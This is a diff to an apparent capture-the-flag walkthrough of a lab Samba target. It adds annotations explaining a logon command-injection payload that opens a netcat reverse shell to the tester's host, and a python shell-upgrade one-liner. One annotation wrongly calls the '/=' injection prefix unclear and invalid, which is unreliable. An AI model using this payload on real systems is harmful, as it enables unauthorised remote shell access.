@@ -42,8 +42,17 @@ smbclient //10.10.10.3/tmp
 ```
 logon "/=`nohup nc -nv 10.10.14.20 4444 -e /bin/sh`"
 ```
+
+logon ---->>>> is likely the name of a function or command that is being called.
+"/=" ---->>>> is not a valid shell syntax and it's not clear what the intention of this string is.
+nohup ---->>>>  is a command that allows a process to continue running in the background even if the user logs out or the terminal is closed.
+-nc ---->>>>  is the netcat command, which is a utility for reading and writing data across network connections.
+-nv ---->>>> are options for nc, which instruct it to use verbose output and to not use DNS for resolving the target IP address.
+-e ---->>>>  is an option for nc that specifies the command to execute after the connection is established.
+/bin/sh ---->>>>  is the command that will be executed on the target machine after the reverse shell connection is established. It launches a shell session, allowing the attacker to interact with the target machine's command line.
+    
 ```
-script -qc /bin/bash /dev/null 
+python3 -c 'import pty;pty.spawn("/bin/bash")' 
 ```
 #   Exploitation #2: Distcc
 
